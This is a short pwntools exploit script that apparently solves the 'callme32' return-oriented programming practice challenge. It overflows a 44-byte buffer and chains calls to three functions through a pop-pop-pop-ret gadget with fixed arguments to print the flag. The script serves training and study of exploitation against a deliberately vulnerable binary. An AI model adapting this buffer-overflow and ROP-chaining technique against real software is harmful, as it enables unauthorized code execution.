from pwn import *

X86_PADDING = 44

elf = context.binary = ELF('callme32')
inputs = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

callme1 = p32(elf.symbols.callme_one)
callme2 = p32(elf.symbols.callme_two)
callme3 = p32(elf.symbols.callme_three)


rop = ROP(elf)
pops_gadget = p32(rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0])

payload = (b"A" * X86_PADDING) + callme1 + pops_gadget + inputs + callme2 + pops_gadget + inputs + callme3 + pops_gadget + inputs

io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
flag = io.recvall()
print(flag)

